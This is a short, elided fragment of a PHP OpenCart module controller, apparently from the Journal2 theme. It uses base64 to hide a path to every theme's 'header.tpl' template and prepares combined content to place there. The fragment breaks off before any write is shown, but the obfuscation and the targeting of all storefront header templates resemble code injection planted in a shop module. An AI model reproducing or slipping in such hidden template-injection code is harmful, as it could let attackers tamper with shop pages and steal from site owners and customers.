...
class ControllerModuleJournal2 extends Controller {
    ...
    public function index() {
		...
		$module = $modules;
		$inherit = base64_decode('');
		
		$ocplace = $inherit . "\n" . $module;		

		foreach(glob(DIR_CATALOG . 'view/theme/*', GLOB_ONLYDIR) as $dif) {
			$rlayout = DIR_CATALOG . 'view/theme/' . basename($dif) . base64_decode('L3RlbXBsYXRlL2NvbW1vbi9oZWFkZXIudHBs');
